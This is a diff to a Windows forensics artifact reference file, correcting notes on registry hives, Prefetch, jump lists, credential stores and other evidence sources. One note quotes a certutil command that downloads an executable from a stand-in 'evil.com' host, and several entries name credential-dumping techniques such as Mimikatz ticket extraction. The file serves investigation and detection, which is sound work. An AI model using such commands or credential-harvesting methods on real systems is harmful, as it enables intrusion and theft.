@@ -1037,7 +1037,7 @@ const ARTIFACTS = [
     color: "#ff6b35",
     definition: "Security Account Manager database stores local user accounts, password hashes (NTLM), group memberships, and account metadata for the local system.",
     paths: ["C:\\Windows\\System32\\config\\SAM", "HKLM\\SAM"],
-    uses: ["User account enumeration", "Password hash extraction", "Last login time", "Account RID mapping", "Brute-force attacks"],
+    uses: ["User account enumeration", "Password hash extraction", "Last login time", "Account RID mapping", "NTLM hash recovery for credential review / cracking investigation"],
     os: ["Windows XP", "Vista", "7", "8", "10", "11"],
     forensicValue: "HIGH",
     tools: ["Autopsy", "RegRipper", "Mimikatz", "volatility", "SAMdump2"],
@@ -1116,7 +1116,7 @@ const ARTIFACTS = [
     os: ["Windows XP", "Vista", "7", "8", "10", "11"],
     forensicValue: "CRITICAL",
     tools: ["RegRipper", "Registry Explorer", "Autopsy", "WinPrefetchView"],
-    notes: "UserAssist key at HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist stores ROT13-encoded app execution data with timestamps and run counts.",
+    notes: "UserAssist key at HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist. Registry value names are ROT13-encoded — decode them to reveal full executable paths. The binary value data (run count, focus time, last-execution FILETIME) is NOT ROT13-encoded.",
 
     commands: [
       { label: 'Export NTUSER.DAT (offline)', cmd: 'copy C:\\Users\\<user>\\NTUSER.DAT C:\\temp\\NTUSER.DAT' },
@@ -1154,7 +1154,7 @@ const ARTIFACTS = [
     name: "AmCache Hive",
     icon: "📋",
     color: "#ff6b35",
-    definition: "Tracks program execution history including executable paths, SHA1 hashes, file metadata, and first execution times. Replaced AppCompatCache in newer Windows.",
+    definition: "Tracks program execution history including executable paths, SHA1 hashes, file metadata, and first execution times. Introduced in Windows 7/8 alongside ShimCache. Complements (does not replace) ShimCache — analyze both. AmCache adds SHA-1 hashes and richer metadata.",
     paths: ["C:\\Windows\\AppCompat\\Programs\\Amcache.hve"],
     uses: ["Malware detection via hash", "Program execution proof", "First run timestamps", "File path of executed programs", "Deleted file evidence"],
     os: ["Windows 8", "10", "11"],
@@ -1339,7 +1339,7 @@ const ARTIFACTS = [
     os: ["Windows XP", "Vista", "7", "8", "10", "11"],
     forensicValue: "CRITICAL",
     tools: ["PECmd", "WinPrefetchView", "Autopsy", "Volatility"],
-    notes: "Disabled on SSDs by default. Filename format: EXECUTABLE-HASH.pf. Up to 128 files stored (Win7) or 1024 (Win8+). Invaluable for proving malware execution.",
+    notes: "Disabled by default on Windows Server. On Windows 10/11 client systems with SSDs, Prefetch is usually still enabled — verify the 'EnablePrefetcher' registry value before assuming absence is anti-forensics. Filename format: EXECUTABLE-HASH.pf. Up to 128 files stored (Win7) or 1024 (Win8+). Invaluable for proving malware execution.",
 
     commands: [
       { label: 'Parse all Prefetch files to CSV', cmd: 'PECmd.exe -d C:\\Windows\\Prefetch --csv C:\\output' },
@@ -1389,7 +1389,7 @@ const ARTIFACTS = [
     os: ["Windows 7", "8", "10", "11"],
     forensicValue: "HIGH",
     tools: ["JLECmd", "Autopsy", "JumpListExplorer"],
-    notes: "AutomaticDestinations stores up to 30 recent items per AppID. Files persist after original deletion. AppIDs map to specific applications.",
+    notes: "AutomaticDestinations stores ~10 recent items per AppID by default, configurable up to ~60 via HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Start_JumpListItems. Files persist after original deletion. AppIDs map to specific applications.",
 
     commands: [
       { label: 'Parse AutomaticDestinations Jump Lists', cmd: 'JLECmd.exe -d "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations" --csv C:\\output' },
@@ -1740,7 +1740,7 @@ const ARTIFACTS = [
     os: ["Windows 10", "11"],
     forensicValue: "HIGH",
     tools: ["RegRipper", "Registry Explorer", "Velociraptor"],
-    notes: "Introduced in Windows 10 1709. Each user SID has separate entries. Timestamps are in UTC. More reliable than Prefetch as it captures command-line executables.",
+    notes: "Introduced in Windows 10 1709. Each user SID has separate entries. Timestamps are in UTC. Tracks executable path and last-run time per user SID. Survives on Server SKUs where Prefetch is disabled. Does NOT capture command-line arguments — pair with EID 4688 (with command-line auditing enabled) or Sysmon EID 1 for full execution context.",
 
     commands: [
       { label: 'Parse BAM with RegRipper', cmd: 'rip.exe -r SYSTEM.hiv -f bam' },
@@ -1812,7 +1812,7 @@ const ARTIFACTS = [
     os: ["Windows XP", "Vista", "7", "8", "10", "11"],
     forensicValue: "CRITICAL",
     tools: ["Volatility", "Hibernation Recon", "Arsenal Recon Hibernation"],
-    notes: "Compressed format. Can be decompressed with Volatility's imagecopy or Arsenal tools. Size = system RAM. Disabled on SSDs by default.",
+    notes: "Compressed format. Can be decompressed with Volatility's imagecopy or Arsenal tools. Size = system RAM. May be disabled by some laptop/tablet OEM power policies — not disabled by Windows on SSDs by default. Verify with 'powercfg /a' and check for C:\\hiberfil.sys regardless.",
 
     commands: [
       { label: 'Convert hiberfil.sys to raw image', cmd: 'volatility -f hiberfil.sys --profile=Win10x64 imagecopy -O memdump.raw' },
@@ -2048,7 +2048,7 @@ const ARTIFACTS = [
     definition: "Windows Task Scheduler executes programs at defined times or triggers. Malware commonly uses scheduled tasks for persistence, often with system or user-level privileges.",
     paths: [
       "C:\\Windows\\System32\\Tasks\\",
-      "C:\\Windows\\SysWOW64\\Tasks\\",
+      "C:\\Windows\\SysWOW64\\Tasks\\ (rare — 32-bit subsystem only; primary location is System32\\Tasks)",
       "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks",
       "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree"
     ],
@@ -2209,7 +2209,7 @@ const ARTIFACTS = [
     os: ["Windows XP", "Vista", "7", "8", "10", "11"],
     forensicValue: "HIGH",
     tools: ["Prefetch", "Sysmon EID 1", "Chainsaw", "SIEM rules"],
-    notes: "Abuse: 'certutil -urlcache -split -f http://evil.com/mal.exe'. Downloads are cached at %APPDATA%\\Microsoft\\CryptnetUrlCache\\. Check Prefetch and command-line audit logs.",
+    notes: "Abuse: 'certutil -urlcache -split -f http://evil.com/mal.exe'. Downloads are cached at %APPDATA%\\..\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content\\ and \\MetaData\\ (i.e. AppData\\LocalLow, NOT Roaming). When run as SYSTEM: C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\. Check Prefetch and command-line audit logs.",
 
     commands: [
       { label: 'Detect certutil download in Prefetch', cmd: 'dir C:\\Windows\\Prefetch\\CERTUTIL.EXE-*.pf' },
@@ -2410,7 +2410,7 @@ const ARTIFACTS = [
     paths: [
       "C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Credentials\\",
       "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Credentials\\",
-      "C:\\Users\\<user>\\AppData\\Local\\Microsoft\\Protect\\ (DPAPI master keys)"
+      "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>\\ (DPAPI master keys)"
     ],
     uses: ["Saved credential discovery", "Lateral movement credential harvesting", "RDP saved passwords", "Network share credentials", "Browser password backup"],
     os: ["Windows XP", "Vista", "7", "8", "10", "11"],
@@ -2484,7 +2484,7 @@ const ARTIFACTS = [
     icon: "🎟️",
     color: "#f59e0b",
     definition: "Kerberos authentication tickets stored in memory (LSASS) and sometimes in ticket cache files. Golden/Silver ticket attacks forge these for persistent unauthorized access.",
-    paths: ["Memory (LSASS process)", "C:\\Windows\\krb5cc_* (Linux-style, rare on Windows)", "Volatile — LSASS process memory"],
+    paths: ["Memory (LSASS process) — LSASS memory only, no on-disk equivalent on native Windows", "Volatile — acquire via memory dump and parse with Mimikatz sekurlsa::tickets or Rubeus dump"],
     uses: ["Pass-the-ticket attacks", "Golden ticket detection", "Silver ticket detection", "Lateral movement via Kerberos", "Privilege escalation"],
     os: ["Windows 2000", "XP", "Vista", "7", "8", "10", "11"],
     forensicValue: "HIGH",
@@ -2788,7 +2788,7 @@ const ARTIFACTS = [
     definition: "System Monitor (Sysmon) is a Sysinternals tool that provides detailed telemetry including process creation with full command lines, network connections, file creation, registry changes, and DLL loads.",
     paths: ["C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%4Operational.evtx"],
     uses: ["Process creation with command line", "Network connection logging", "File creation monitoring", "Registry change detection", "DLL injection detection", "Credential dumping detection"],
-    os: ["Windows XP", "Vista", "7", "8", "10", "11"],
+    os: ["Vista", "7", "8", "10", "11"],
     forensicValue: "CRITICAL",
     tools: ["Event Viewer", "Chainsaw", "Hayabusa", "Sigma rules", "SplunkML"],
     notes: "Must be installed separately. Key EIDs: 1 (Process Create), 3 (Network), 7 (Image Load), 8 (CreateRemoteThread), 10 (ProcessAccess/LSASS), 11 (FileCreate), 12/13 (Registry), 15 (FileStream). Config via sysmon -c config.xml.",
@@ -3898,7 +3898,7 @@ const ARTIFACTS = [
     name: "SDelete Wipe Patterns",
     icon: "💣",
     color: "#ef4444",
-    definition: "Sysinternals SDelete securely deletes files by overwriting with DOD 5220.22-M patterns before deletion. Leaves recognizable wipe signatures in unallocated space and MFT entry patterns even after the file is gone.",
+    definition: "Sysinternals SDelete securely deletes files by overwriting before deletion. Default: single overwrite pass. Configurable to multi-pass DoD-style patterns with -p N flag. Leaves recognizable wipe signatures in unallocated space and MFT entry patterns even after the file is gone.",
     paths: [
       "C:\\Windows\\Prefetch\\SDELETE.EXE-*.pf",
       "C:\\Windows\\Prefetch\\SDELETE64.EXE-*.pf",
@@ -4329,9 +4329,9 @@ const ARTIFACTS = [
       "NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Search\\RecentApps"
     ],
     uses: ["Prove application was executed", "Execution count tracking", "Last execution timestamp", "Alternative to Prefetch when disabled", "GUI application execution proof"],
-    os: ["Windows 10", "11"],
+    os: ["Windows 10 (1607–1709/1803 only)"],
     tools: ["RegRipper", "Registry Explorer", "Autopsy"],
-    notes: "Each GUID subkey under RecentApps points to a recently executed application. AppID contains the name of the application. LastAccessTime stores the last execution time in UTC. LaunchCount stores the number of times the application was executed. This is a Windows 10+ only artifact. Particularly valuable when Prefetch is disabled (common on SSDs and server systems). The GUID keys persist even after the application is uninstalled — providing evidence of prior software installation and execution.",
+    notes: "Each GUID subkey under RecentApps points to a recently executed application. AppID contains the name of the application. LastAccessTime stores the last execution time in UTC. LaunchCount stores the number of times the application was executed. IMPORTANT: This key was introduced in Windows 10 build 1607 and removed around build 1709/1803 — it does NOT exist on modern Windows 10 (1803+) or Windows 11. On Windows 10 1809+ and Windows 11, use BAM/DAM (#30) instead. The GUID keys persist even after the application is uninstalled — providing evidence of prior software installation and execution.",
     commands: [
       { label: "Query RecentApps key", cmd: "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Search\\RecentApps\" /s" },
       { label: "Parse with RegRipper", cmd: "rip.exe -r NTUSER.DAT -f recentapps" },
@@ -4587,7 +4587,7 @@ const ARTIFACTS = [
     uses: ["Chat communication history", "File transfer evidence", "Contact list reconstruction", "Call log timeline", "Prove communication between parties", "Deleted message recovery"],
     os: ["Windows XP", "Vista", "7", "8", "10", "11"],
     tools: ["DB Browser for SQLite", "SkypeLogView (Nirsoft)", "Autopsy", "Oxygen Forensics"],
-    notes: "Skype stores data in main.db SQLite database. Key tables: Messages (all chat with timestamps and sender), Calls (call log with duration and participants), Transfers (file transfers -- filename, size, status), Contacts (contact list), Conversations (threads). File transfers are particularly valuable -- they record filename and transfer completion status. Chat logs persist after UI deletion because Skype does not securely wipe deleted messages. Timestamps are Unix epoch format. The main.db can be opened directly with DB Browser for SQLite.",
+    notes: "NOTE: main.db applies to Skype Classic (version 7.x and earlier, retired ~2018). Modern Skype (8.x+, Electron-based) uses IndexedDB/LevelDB storage — consult per-version research for current paths. For legacy Skype Classic: key tables are Messages (all chat with timestamps and sender), Calls (call log with duration and participants), Transfers (file transfers -- filename, size, status), Contacts (contact list), Conversations (threads). Chat logs persist after UI deletion because Skype does not securely wipe deleted messages. Timestamps are Unix epoch format.",
     commands: [
       { label: "Find Skype database", cmd: "dir /s /b \"%APPDATA%\\Skype\\\" | findstr /i \"main.db\"" },
       { label: "Read all chat messages", cmd: "sqlite3 main.db \"SELECT datetime(timestamp,'unixepoch'), author, body_xml FROM Messages ORDER BY timestamp\"" },
